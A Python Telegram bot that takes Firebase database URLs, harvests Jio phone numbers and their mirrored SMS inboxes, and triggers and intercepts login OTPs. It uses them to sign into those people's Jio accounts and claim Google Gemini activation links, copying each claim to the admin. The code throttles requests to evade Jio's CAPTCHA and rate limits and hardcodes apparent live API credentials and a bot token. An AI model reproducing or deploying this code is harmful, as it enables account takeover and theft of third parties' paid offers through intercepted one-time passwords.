import os
import sys
import re
import time
import asyncio
import logging
from typing import Dict, List, Optional, Set, Tuple, Union
from concurrent.futures import ThreadPoolExecutor

sys.stdout.reconfigure(encoding='utf-8')

# Logging Configuration
logging.basicConfig(
    format='[%(asctime)s] %(levelname)s: %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("GeminiClaimer")

from telethon import TelegramClient, events

from firebase_engine import FirebaseEngine, clean_firebase_url, extract_firebase_urls, scan_multiple_firebase_urls
from otp_watcher import OTPWatcher
from realjio import JioDirectClaimer, check_jio_number, clean_phone_number

# Configuration
API_ID = 33316824
API_HASH = "f24ba90df909312f3368a3ee2f68487b"
BOT_TOKEN = "8738956350:AAEWnxJ4r9UkKpQNDOBQwN_cDyfAWGXF_j4"
ADMIN_ID = 7002290873
NUM_PARALLEL_WORKERS = 6

# File Paths
LINKS_FILE = "links.txt"
PROCESSED_FILE = "processed_numbers.txt"
ALL_USERS_FILE = "bot_users.txt"

# State
job_queue: List[Dict] = []
current_job: Optional[Dict] = None
processed_numbers: Set[str] = set()
bot_users: Set[int] = set()
worker_lock = asyncio.Lock()
claimed_links_set: Set[str] = set()


def load_claimed_links():
    global claimed_links_set
    claimed_links_set.clear()
    if os.path.exists(LINKS_FILE):
        try:
            with open(LINKS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    pm = re.search(r'Mobile:\s*(\d+)', line)
                    if pm:
                        claimed_links_set.add(pm.group(1).strip())
                    lm = re.search(r'Link:\s*(\S+)', line)
                    if lm:
                        claimed_links_set.add(lm.group(1).strip())
            logger.info(f"Loaded {len(claimed_links_set)} unique claimed entities from {LINKS_FILE}")
        except Exception as e:
            logger.error(f"Error loading claimed links: {e}")


def load_persistence():
    global processed_numbers, bot_users
    if os.path.exists(PROCESSED_FILE):
        try:
            with open(PROCESSED_FILE, "r", encoding="utf-8") as f:
                processed_numbers = set(line.strip() for line in f if line.strip())
            logger.info(f"Loaded {len(processed_numbers)} processed numbers from {PROCESSED_FILE}")
        except Exception as e:
            logger.error(f"Error loading processed numbers: {e}")

    if os.path.exists(ALL_USERS_FILE):
        try:
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                bot_users = set(int(line.strip()) for line in f if line.strip().isdigit())
        except Exception as e:
            logger.error(f"Error loading bot users: {e}")

    load_claimed_links()


def save_processed_number(phone: str):
    processed_numbers.add(phone)
    try:
        with open(PROCESSED_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone}\n")
    except Exception as e:
        logger.error(f"Error saving processed number {phone}: {e}")


def save_claimed_link(user_id: int, phone: str, link: str) -> bool:
    """Saves claimed link. Returns True if fresh/saved, False if duplicate."""
    if phone in claimed_links_set or link in claimed_links_set:
        logger.info(f"Duplicate link/phone {phone} already saved. Skipping duplicate save.")
        return False

    claimed_links_set.add(phone)
    claimed_links_set.add(link)

    timestamp_str = time.strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp_str}] User: {user_id} | Mobile: {phone} | Link: {link}\n"
    
    # Save to global links file
    try:
        with open(LINKS_FILE, "a", encoding="utf-8") as f:
            f.write(log_line)
    except Exception as e:
        logger.error(f"Error appending to {LINKS_FILE}: {e}")

    # Save to user-specific links file
    user_file = f"user_links_{user_id}.txt"
    try:
        with open(user_file, "a", encoding="utf-8") as f:
            f.write(log_line)
    except Exception as e:
        logger.error(f"Error saving to {user_file}: {e}")
    return True


def save_bot_user(user_id: int):
    if user_id not in bot_users:
        bot_users.add(user_id)
        try:
            with open(ALL_USERS_FILE, "a", encoding="utf-8") as f:
                f.write(f"{user_id}\n")
        except Exception:
            pass


# Telethon Frontend Bot Client
bot_client = TelegramClient('target_gemini_bot_session', API_ID, API_HASH)

device_locks: Dict[str, asyncio.Lock] = {}
last_otp_time = 0.0
otp_throttle_lock = asyncio.Lock()


async def throttled_send_otp(claimer: JioDirectClaimer) -> Tuple[bool, str]:
    """
    Sends OTP with a global stagger delay (1.8s) and adaptive backoff for CAPTCHA_REQUIRED.
    This prevents hitting Jio's burst anti-spam / WAF rate limits.
    """
    global last_otp_time
    async with otp_throttle_lock:
        now = time.time()
        elapsed = now - last_otp_time
        if elapsed < 1.8:
            await asyncio.sleep(1.8 - elapsed)
        
        ok, msg = await asyncio.to_thread(claimer.send_otp)
        last_otp_time = time.time()

        if not ok and msg == "CAPTCHA_REQUIRED":
            logger.warning("⚠️ Jio WAF/IP Rate Limit ('CAPTCHA_REQUIRED') triggered! Cooling down for 12 seconds...")
            await asyncio.sleep(12.0)
            # Retry once after cooldown
            ok, msg = await asyncio.to_thread(claimer.send_otp)
            last_otp_time = time.time()

        return ok, msg


def get_device_lock(dev: Dict) -> asyncio.Lock:
    dev_key = dev.get('device_id') or (dev.get('sms_paths') or [dev.get('sms_path')])[0]
    if dev_key not in device_locks:
        device_locks[dev_key] = asyncio.Lock()
    return device_locks[dev_key]


async def process_single_number(
    phone: str,
    base_url: str,
    sms_paths: Union[str, List[str]],
    max_retries: int = 2
) -> Tuple[str, Optional[str]]:
    """
    Directly processes a Jio number without any 3rd-party bot:
    1. Validates number via Jio Mobility API.
    2. Sends OTP via Jio Login Service API (throttled & resilient against CAPTCHA).
    3. Watches Firebase RTDB SMS node in real time for fresh incoming OTP.
    4. Validates captured OTP via Jio Login Service API.
    5. Directly claims Google Gemini activation link via Jio OTT APIs.
    """
    clean_num = clean_phone_number(phone)
    if len(clean_num) != 10:
        return 'INVALID', None

    # Step 1: Pre-validate Jio number
    is_jio = await asyncio.to_thread(check_jio_number, clean_num)
    if not is_jio:
        logger.warning(f"⚡ Fast-failed non-Jio number: {clean_num}")
        return 'INVALID', None

    watcher = OTPWatcher(base_url, sms_paths, timeout=28)

    for attempt in range(1, max_retries + 1):
        if attempt > 1:
            logger.info(f"🔄 Retrying {clean_num} with fresh session (Attempt {attempt}/{max_retries})...")
            await asyncio.sleep(2.5)

        claimer = JioDirectClaimer(clean_num)
        baseline_keys, baseline_ts = watcher.get_baseline()

        # Step 2: Send OTP directly via Jio API (with throttling & adaptive backoff)
        ok, msg = await throttled_send_otp(claimer)
        if not ok:
            logger.warning(f"[-] Failed to send OTP for {clean_num}: {msg}")
            if any(k in msg for k in ["INVALID_JIONUMBER", "NOT_SUBSCRIBED", "INVALID"]):
                return 'INVALID', None
            if attempt == max_retries:
                return 'ERROR', None
            await asyncio.sleep(2.0)
            continue

        if msg == "SEND_OTP_CURRENTLY_LOCKED":
            logger.info(f"ℹ️ OTP already locked/active on Jio for {clean_num}. Listening for SMS on Firebase...")

        sms_summary = ", ".join(watcher.sms_paths[:2])
        logger.info(f"OTP sent to {clean_num}. Listening on Firebase for fresh SMS: [{sms_summary}] (Attempt {attempt}/{max_retries})...")

        # Step 3: Watch for incoming OTP (only fresh keys after baseline)
        otp_result = await watcher.wait_for_otp(baseline_keys, baseline_ts, poll_interval=0.8)
        if not otp_result:
            logger.warning(f"OTP Timeout for {clean_num} (Attempt {attempt}/{max_retries})")
            if attempt < max_retries:
                continue
            return 'TIMEOUT', None

        otp_code, sms_body = otp_result
        logger.info(f"🔥 Captured fresh live OTP for {clean_num}: {otp_code}! Validating with Jio...")

        # Step 4: Validate OTP
        val_ok, val_msg = await asyncio.to_thread(claimer.validate_otp, otp_code)
        if not val_ok:
            logger.warning(f"⚠️ OTP verification failed for {clean_num} ({val_msg}). Retrying...")
            if attempt < max_retries:
                continue
            return 'INVALID_OTP', None

        logger.info(f"[+] OTP verified! Claiming Google Gemini offer from Jio OTT service for {clean_num}...")

        # Step 5: Claim Gemini offer directly from Jio
        status, link, details = await asyncio.to_thread(claimer.claim_gemini)
        logger.info(f"Claim result for {clean_num}: status={status}, link={link}, details={details}")

        if link:
            return status, link
        elif status in {'ALREADY_CLAIMED', 'ALREADY_USED'}:
            return 'ALREADY_CLAIMED', None
        elif status == 'NO_OFFER':
            return 'NO_OFFER', None
        else:
            return 'ERROR', None

    return 'ERROR', None


async def process_job(job: Dict):
    user_id = job['user_id']
    raw_url = job['url']
    cleaned_url = clean_firebase_url(raw_url)

    logger.info(f"Starting job for user {user_id} on database {cleaned_url} with {NUM_PARALLEL_WORKERS} direct async workers")

    try:
        await bot_client.send_message(
            user_id,
            f"🚀 **Direct Jio Engine Se Processing Shuru Ho Gayi Hai!**\n\n"
            f"🔗 `{cleaned_url}`\n"
            f"⚡ **In-House Engine:** 100% Direct Jio API (No Bot Delay)\n"
            f"⚡ **Parallel Concurrency:** `{NUM_PARALLEL_WORKERS}` Workers\n\n"
            f"🔍 Active Jio devices scan kiye ja rahe hain..."
        )
    except Exception as e:
        logger.warning(f"Failed to notify user {user_id}: {e}")

    # Scan database for devices
    engine = FirebaseEngine(cleaned_url)
    devices = engine.discover_devices(max_devices=150)

    if not devices:
        try:
            await bot_client.send_message(
                user_id,
                f"⚠️ **Koi Valid Jio Device Nahi Mila!**\n\n"
                f"Database `{cleaned_url}` me koi active Jio number ya SMS path nahi mila.\n"
                f"Aap doosra Firebase database bhej sakte hain."
            )
        except Exception:
            pass
        return

    phone_queue = asyncio.Queue()
    skipped_count = 0
    queued_devices = []

    for dev in devices:
        p = dev['phone']
        if p in processed_numbers:
            skipped_count += 1
        else:
            queued_devices.append(dev)
            await phone_queue.put(dev)

    total_queued = len(queued_devices)
    if total_queued == 0:
        try:
            await bot_client.send_message(
                user_id,
                f"ℹ️ **Database ke sabhi {len(devices)} Jio numbers pehle hi process ho chuke hain!**\n\n"
                f"Naya database bhejein ya `/reset_history` karein."
            )
        except Exception:
            pass
        return

    try:
        await bot_client.send_message(
            user_id,
            f"📱 **{len(devices)} Active Live Jio Devices Mil Gaye Hain!**\n\n"
            f"• **Live Jio Numbers (Queue Me):** `{total_queued}`\n"
            f"• **Dead/Inactive Numbers:** Auto-filtered out ⚡\n"
            f"• **Pehle se processed:** `{skipped_count}`\n"
            f"• **Direct API Concurrency:** `{NUM_PARALLEL_WORKERS}` parallel slots ⚡\n\n"
            f"Direct Jio API se claim kiye ja rahe hain.\n"
            f"**Sabhi links seedhe aapko yahan deliver honge!** 🎁"
        )
    except Exception:
        pass

    links_claimed = 0
    tried_count = 0
    job_lock = asyncio.Lock()

    async def worker_consumer(worker_id: int):
        nonlocal links_claimed, tried_count
        while not phone_queue.empty() and not job.get('cancelled'):
            try:
                dev = phone_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            phone = dev['phone']
            async with job_lock:
                if phone in processed_numbers:
                    phone_queue.task_done()
                    continue
                save_processed_number(phone)
                tried_count += 1
                curr_idx = tried_count

            sms_targets = dev.get('sms_paths') or [dev['sms_path']]
            paths_log = ", ".join(sms_targets[:2])
            score_str = f"Score: {dev.get('activity_score', 0)}"
            logger.info(f"[Worker #{worker_id}] Processing ({curr_idx}/{total_queued}): Phone {phone} ({score_str}) | SMS: [{paths_log}]")

            dev_lock = get_device_lock(dev)
            async with dev_lock:
                status, link = await process_single_number(phone, cleaned_url, sms_targets)

            if link:
                saved = False
                async with job_lock:
                    if save_claimed_link(user_id, phone, link):
                        links_claimed += 1
                        total_links = links_claimed
                        saved = True
                    else:
                        total_links = len(claimed_links_set) // 2

                is_already_claimed = (status in {'ALREADY_CLAIMED', 'ALREADY_USED'})
                status_header = "⚠️ **Gemini Activation Link (Already Claimed Account)**" if is_already_claimed else "🎁 **Naya Gemini Activation Link Claim Ho Gaya!**"
                status_tag = "Already Claimed Account (Extracted Link) 🔗" if is_already_claimed else "Fresh / Active Link 🚀"

                delivery_text = (
                    f"{status_header}\n\n"
                    f"🔗 **Link:** {link}\n"
                    f"📱 **Jio Number:** `{phone}`\n"
                    f"📊 **Aapke Total Links:** `{total_links}`\n"
                    f"⚡ **Status:** {status_tag}\n"
                    f"⚡ **Engine:** In-House Direct Jio API 🚀\n\n"
                    f"_(Link ko click karke apna subscription activate karein)_"
                )

                # Send to user
                try:
                    await bot_client.send_message(user_id, delivery_text)
                except Exception as ne:
                    logger.error(f"Failed to send link to user {user_id}: {ne}")

                # If submitting user is not the admin, also deliver a copy to the admin (7210247354)
                if user_id != ADMIN_ID:
                    try:
                        await bot_client.send_message(ADMIN_ID, f"🔔 [Copy from User {user_id}]\n{delivery_text}")
                    except Exception as ae:
                        logger.error(f"Failed to send admin copy: {ae}")
            elif status in {'ALREADY_CLAIMED', 'ALREADY_USED'}:
                logger.info(f"[Worker #{worker_id}] Phone {phone} is ALREADY_CLAIMED (no direct link returned).")
            elif status == 'NO_OFFER':
                logger.info(f"[Worker #{worker_id}] Phone {phone} has no Google AI offer.")
            elif status == 'INVALID':
                logger.info(f"[Worker #{worker_id}] Phone {phone} is not a valid Jio number.")
            elif status == 'TIMEOUT':
                logger.warning(f"[Worker #{worker_id}] Phone {phone} OTP timed out.")

            phone_queue.task_done()
            await asyncio.sleep(0.5)

    tasks = [asyncio.create_task(worker_consumer(i + 1)) for i in range(NUM_PARALLEL_WORKERS)]
    await asyncio.gather(*tasks)

    # Job Finished Summary
    logger.info(f"Finished job for user {user_id}. Total links claimed: {links_claimed}, tried: {tried_count}, skipped: {skipped_count}")
    summary_msg = (
        f"🏁 **Database Process Complete!**\n\n"
        f"🔗 **Total Gemini Links Claimed:** `{links_claimed}`\n"
        f"📱 **Total Numbers Processed:** `{tried_count}`\n"
    )
    if skipped_count > 0:
        summary_msg += f"ℹ️ **Pehle se processed numbers (Skipped):** `{skipped_count}`\n"
    summary_msg += (
        f"⚡ **Engine:** In-House Direct Jio API (Khud Ka)\n"
        f"🌐 **Database:** `{cleaned_url}`\n\n"
        f"Sabhi fresh links aapko deliver kar diye gaye hain. Aap agla Firebase URL bhej sakte hain! 🚀"
    )
    try:
        await bot_client.send_message(user_id, summary_msg)
    except Exception:
        pass


async def worker_loop():
    """Continuous background loop that processes user Firebase jobs sequentially."""
    global current_job

    logger.info("Direct Jio worker loop started. Ready for incoming user jobs.")

    while True:
        if not job_queue:
            await asyncio.sleep(1.5)
            continue

        async with worker_lock:
            current_job = job_queue.pop(0)

        try:
            await process_job(current_job)
        except Exception as e:
            logger.error(f"Error processing job: {e}")
        finally:
            current_job = None
            await asyncio.sleep(2.0)


# Bot Event Handlers
@bot_client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    save_bot_user(user_id)

    msg = (
        "🌟 **Jio Gemini Auto Claimer Bot (Direct Engine)** 🌟\n\n"
        "Aapko bas apna **Firebase Realtime Database URL** bhejna hai.\n\n"
        "⚡ **In-House Direct System:**\n"
        "1. Kisi teesre ke bot par depend nahi hai — 100% apna direct Jio engine.\n"
        "2. Real-time me Firebase se OTP auto-capture hota hai.\n"
        "3. Jio ke direct API se Google Gemini Activation Link claim hota hai.\n"
        "4. **Sabhi generated links seedhe AAPKO deliver hote hain!** 🎁\n\n"
        "👉 **Apna Firebase URL (Single ya Multiple) yahan paste karein:**\n"
        "• Ek URL ya poori list ek saath bhej sakte hain!\n"
        "• Numbered list (jaise `84. https://...`) bhi directly accept ho jayegi.\n"
        "_(Jaise: `https://your-app-default-rtdb.firebaseio.com/`)_"
    )
    await event.reply(msg)


@bot_client.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    user_id = event.sender_id
    save_bot_user(user_id)

    user_file = f"user_links_{user_id}.txt"
    my_links_count = 0
    if os.path.exists(user_file):
        try:
            with open(user_file, "r", encoding="utf-8") as f:
                my_links_count = sum(1 for line in f if "http" in line)
        except Exception:
            pass

    is_running_for_me = current_job and current_job.get('user_id') == user_id
    my_queue_pos = next((i + 1 for i, j in enumerate(job_queue) if j['user_id'] == user_id), None)

    state_desc = "Idle (Kuch process nahi ho raha)"
    if is_running_for_me:
        state_desc = f"🔥 Aapka database process ho raha hai: `{current_job.get('url')}`"
    elif my_queue_pos:
        state_desc = f"⏳ Aapka database line me hai (Position: {my_queue_pos})"

    msg = (
        f"📊 **Aapka Status:**\n\n"
        f"• **Current State:** {state_desc}\n"
        f"• **Aapke Claimed Gemini Links:** `{my_links_count}`\n"
        f"• **Line me kul databases:** `{len(job_queue)}`\n"
        f"• **Direct Jio Parallel Concurrency:** `{NUM_PARALLEL_WORKERS}` slots ⚡\n\n"
        f"Koi naya Firebase URL bhej kar queue me add kar sakte hain!"
    )
    await event.reply(msg)


@bot_client.on(events.NewMessage(pattern='/cancel'))
async def cancel_handler(event):
    user_id = event.sender_id
    global current_job

    cancelled = False
    if current_job and current_job.get('user_id') == user_id:
        current_job['cancelled'] = True
        cancelled = True

    initial_len = len(job_queue)
    job_queue[:] = [j for j in job_queue if j['user_id'] != user_id]
    if len(job_queue) < initial_len:
        cancelled = True

    if cancelled:
        await event.reply("❌ **Aapka chal raha/line me laga process cancel kar diya gaya hai.**")
    else:
        await event.reply("Aapka koi active process ya queue me request nahi hai.")


@bot_client.on(events.NewMessage(pattern='/reset_history'))
async def reset_history_handler(event):
    if event.sender_id != ADMIN_ID:
        await event.reply("⚠️ Sirf Admin ye command use kar sakte hain.")
        return
    global processed_numbers
    processed_numbers.clear()
    if os.path.exists(PROCESSED_FILE):
        try:
            os.remove(PROCESSED_FILE)
        except Exception:
            pass
    await event.reply("✅ `processed_numbers` clear kar diya gaya hai! Sabhi numbers dobara process ho sakte hain.")


@bot_client.on(events.NewMessage(pattern='/workers'))
async def workers_handler(event):
    user_id = event.sender_id
    save_bot_user(user_id)

    msg = (
        f"⚡ **Direct Jio Claimer Engine Status:**\n\n"
        f"• **Mode:** 100% In-House Direct API (Khud Ka)\n"
        f"• **Active Concurrency Slots:** `{NUM_PARALLEL_WORKERS}` Parallel Workers\n"
        f"• **3rd-Party Bot Dependency:** NONE (Removed Completely) 🚀\n"
        f"• **Telegram Account Limits:** None (Direct HTTP to Jio)\n\n"
        f"Har number directly Jio ke REST APIs se verify aur claim hota hai!"
    )
    await event.reply(msg)


@bot_client.on(events.NewMessage(pattern=r'^/scan(?:\s+([\s\S]+))?$'))
async def scan_command_handler(event):
    user_id = event.sender_id
    save_bot_user(user_id)

    raw_args = (event.pattern_match.group(1) or "").strip()
    urls = extract_firebase_urls(raw_args)

    if not urls and os.path.exists('firebase_url.txt'):
        try:
            with open('firebase_url.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    u = clean_firebase_url(line.strip().split()[-1] if line.strip() else "")
                    if u.startswith('http'):
                        urls.append(u)
        except Exception:
            pass

    # Deduplicate
    unique_urls = []
    seen = set()
    for u in urls:
        if u not in seen:
            seen.add(u)
            unique_urls.append(u)

    if not unique_urls:
        await event.reply(
            "⚠️ **Koi Firebase URLs nahi mile scan karne ke liye!**\n\n"
            "Aap URL(s) bhej sakte hain:\n"
            "`/scan https://your-db-default-rtdb.firebaseio.com`"
        )
        return

    status_msg = await event.reply(
        f"⚡ **Parallel Turbo Scan Shuru Ho Gaya!**\n\n"
        f"• **Kul Databases:** `{len(unique_urls)}`\n"
        f"• **Concurrency:** `50 Parallel Workers`\n"
        f"• Kuch hi seconds me sabhi live Jio devices nikal rahe hain..."
    )

    try:
        sorted_devices, summary = await asyncio.to_thread(scan_multiple_firebase_urls, unique_urls, 50)
    except Exception as e:
        await status_msg.edit(f"❌ Scan ke dauran error: {e}")
        return

    lines = [
        f"🚀 **PARALLEL SCAN COMPLETE in {summary['duration']}s!** ⚡\n",
        f"• **Databases Scanned:** `{summary['total_urls']}`",
        f"• **Active DBs with Devices:** `{summary['active_dbs']}`",
        f"• **Total Unique Numbers:** `{summary['total_unique_phones']}`",
        f"• **🔥 Verified Live / Recent Jio Devices:** `{summary['live_phones']}`\n"
    ]

    if sorted_devices:
        lines.append("🏆 **Top Active Live Jio Devices:**")
        for idx, d in enumerate(sorted_devices[:8], 1):
            live_tag = "🟢 ONLINE" if d.get('status_online') else ("🟡 RECENT" if d.get('activity_score', 0) >= 500 else "⚪ CANDIDATE")
            phone = d['phone']
            carrier = d.get('carrier', 'Jio')
            sms = d.get('sms_path', 'receivedSms')
            lines.append(f"{idx}. `{phone}` | {live_tag} | Carrier: {carrier}\n   ↳ SMS: `{sms}`")

        lines.append("\n👉 Inhe claim karne ke liye simply list paste karein — bot automatically claim shuru kar dega! 🎁")
    else:
        lines.append("⚠️ In databases me koi active Jio device nahi mila.")

    try:
        await status_msg.edit("\n".join(lines))
    except Exception:
        await event.reply("\n".join(lines))


@bot_client.on(events.NewMessage)
async def message_handler(event):
    text = (event.text or "").strip()
    if text.startswith('/'):
        return

    user_id = event.sender_id
    save_bot_user(user_id)

    # Extract all Firebase URLs from the user's message (single or multiple)
    found_urls = extract_firebase_urls(text)
    if not found_urls:
        await event.reply(
            "⚠️ **Koi valid Firebase Realtime Database URL nahi mila!**\n\n"
            "Aap single URL ya multiple URLs (list format me) bhej sakte hain:\n"
            "_(Jaise: `https://your-app-default-rtdb.firebaseio.com/`)_"
        )
        return

    # Check which URLs are already currently queued for this user
    already_queued_urls = set(j['url'] for j in job_queue if j['user_id'] == user_id)
    if current_job and current_job.get('user_id') == user_id:
        already_queued_urls.add(current_job.get('url'))

    new_urls = [u for u in found_urls if u not in already_queued_urls]
    if not new_urls:
        await event.reply("⏳ Yeh sabhi database(s) pehle se hi line (queue) me lage hain ya process ho rahe hain!")
        return

    status_msg = await event.reply(
        f"⚡ **{len(new_urls)} Database(s) ka Fast Parallel Device Scan shuru ho gaya...**\n"
        f"_(Concurrency: 50 Workers)_"
    )

    try:
        sorted_devices, summary = await asyncio.to_thread(scan_multiple_firebase_urls, new_urls, 40)
    except Exception as e:
        logger.error(f"Error scanning URLs: {e}")
        sorted_devices, summary = [], {'duration': 0, 'active_dbs': 0, 'total_unique_phones': 0, 'live_phones': 0, 'dbs': {}}

    valid_jobs = []
    failed_jobs = []

    for u in new_urls:
        db_info = summary.get('dbs', {}).get(u, {})
        if db_info.get('status') == 'open' or db_info.get('devices_count', 0) > 0:
            job = {
                'user_id': user_id,
                'username': getattr(event.sender, 'username', None),
                'url': u,
                'added_at': time.time(),
                'cancelled': False
            }
            job_queue.append(job)
            valid_jobs.append((u, db_info.get('devices_count', 0), db_info.get('live_count', 0)))
        else:
            # Test connection fallback in case DB was empty
            eng = FirebaseEngine(u)
            ok, err_msg = eng.test_connection()
            if ok:
                job = {
                    'user_id': user_id,
                    'username': getattr(event.sender, 'username', None),
                    'url': u,
                    'added_at': time.time(),
                    'cancelled': False
                }
                job_queue.append(job)
                valid_jobs.append((u, 0, 0))
            else:
                failed_jobs.append((u, err_msg))

    response_lines = []
    if valid_jobs:
        response_lines.append(f"✅ **{len(valid_jobs)} Database(s) Connected in {summary.get('duration', 0)}s!** ⚡\n")
        response_lines.append(f"• **Kul Discovered Numbers:** `{summary.get('total_unique_phones', 0)}`")
        response_lines.append(f"• **🔥 Live / Active Jio Devices:** `{summary.get('live_phones', 0)}`\n")

        max_show = 8
        for i, (u, dev_cnt, live_cnt) in enumerate(valid_jobs[:max_show], 1):
            pos = next((idx + 1 for idx, j in enumerate(job_queue) if j['url'] == u), len(job_queue))
            detail_str = f"({dev_cnt} devices, {live_cnt} live)" if dev_cnt > 0 else ""
            response_lines.append(f"{i}. `{u}` #{pos} {detail_str}")
        if len(valid_jobs) > max_show:
            response_lines.append(f"_...aur {len(valid_jobs) - max_show} aur databases line me lage hain._")
        response_lines.append(f"\n⚡ **Total Line (Queue):** `{len(job_queue)}` database(s)")
        response_lines.append(f"🚀 **{NUM_PARALLEL_WORKERS} Parallel Workers** se auto-claim shuru ho raha hai!\nSabhi links direct aapko deliver honge! 🎁")

    if failed_jobs:
        if response_lines:
            response_lines.append("\n----------------------------------")
        response_lines.append(f"⚠️ **{len(failed_jobs)} Database(s) Connect Nahi Ho Sake (Skipped):**")
        for u, reason in failed_jobs[:5]:
            response_lines.append(f"• `{u}`\n  ↳ _{reason}_")
        if len(failed_jobs) > 5:
            response_lines.append(f"_...aur {len(failed_jobs) - 5} invalid databases._")

    final_reply = "\n".join(response_lines)
    try:
        await status_msg.edit(final_reply)
    except Exception:
        try:
            await event.reply(final_reply)
        except Exception:
            pass


async def main():
    load_persistence()
    logger.info("Starting Direct Jio Gemini Claimer System...")
    
    await bot_client.start(bot_token=BOT_TOKEN)
    bot_me = await bot_client.get_me()
    logger.info(f"Frontend Bot Online: @{bot_me.username} ({bot_me.first_name})")

    # Start background direct Jio worker loop
    asyncio.create_task(worker_loop())

    logger.info(f"System fully initialized with {NUM_PARALLEL_WORKERS} parallel in-house Jio workers! Waiting for user Firebase URLs...")
    await bot_client.run_until_disconnected()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Process stopped by user.")
